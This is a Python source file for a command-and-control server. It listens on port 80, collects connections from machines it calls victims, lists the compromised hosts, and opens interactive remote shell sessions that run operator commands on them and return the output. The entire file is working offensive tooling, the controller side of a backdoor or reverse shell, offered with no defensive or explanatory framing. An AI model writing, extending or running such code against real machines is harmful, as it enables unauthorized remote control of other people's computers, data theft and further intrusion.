import socket,os
import threading
import platform
CMD = ""
index = 0
shell = False
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 80
BUFFER = 1024 * 128 
victim_sockets = []
victim_address = []
victim_host = []

def listener():
    global SERVER_HOST,SERVER_PORT,BUFFER,client_socket, client_address
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    #print("[+]Listening for connections...")
    # accept any connections attempted
    client_socket, client_address = s.accept()
    host = client_socket.recv(1024).decode()
    victim_sockets.append(client_socket)
    victim_address.append(client_address)
    victim_host.append(host)
    print("\n[+]Acquired new host:"+ host+" , "+client_address[0]+":"+str(client_address[1]))
    #print(f"{client_address[0]}:{client_address[1]} Connected!")

def listhosts():
    global victim_address,victim_sockets
    print(" "*8+"SessionID"+" "*8+"IP"+" "*16+"Hostname")
    print(" "*8+"="*50)
    for i in range(len(victim_sockets)):
        print(" "*8+str(i)+" "*(7+len("SessionID"))+victim_address[i][0]+" "*8+victim_host[i])

def C2():
    global shell,CMD,BUFFER,client_socket, client_address,index
    while True:
        print("C2>",end = "")
        CMD = input()
        if CMD != "":
            if (CMD.split())[0] == "use":
                index = int((CMD.split())[1])
                shell = True
                
            elif CMD == "quit":
                exit()
                
            elif CMD == "help":
                print('''
                Available Commands:
                                    help:show this help menu
                                    list:list acquired hosts
                                    use <index>:open a shell session with a host
                                    quit:exit the program
                ''')
            elif CMD == "list":
                listhosts()
            elif CMD == "clear" or CMD == "cls":
                os.system("cls")
        
            else:
                print(CMD+"[+]Invalid Command.Try typing 'help'")
        while shell:
            CMD = input("cmd>")
            if CMD != "":
                try:
                    victim_sockets[index].send(CMD.encode())
                    output = victim_sockets[index].recv(BUFFER).decode()
                    print('\n'+output)
                except:
                    print("[!]Network error.Target is offline")
                if CMD == "exit":
                    victim_sockets.remove(victim_sockets[index])
                    victim_address.remove(victim_address[index])
                    victim_host.remove(victim_host[index])
                    shell = False
                    break
                elif CMD == "cls" or CMD == "clear":
                    os.system("cls")
while True:
    thread = threading.Thread(target=C2,args=())
    thread.start()
    listener()


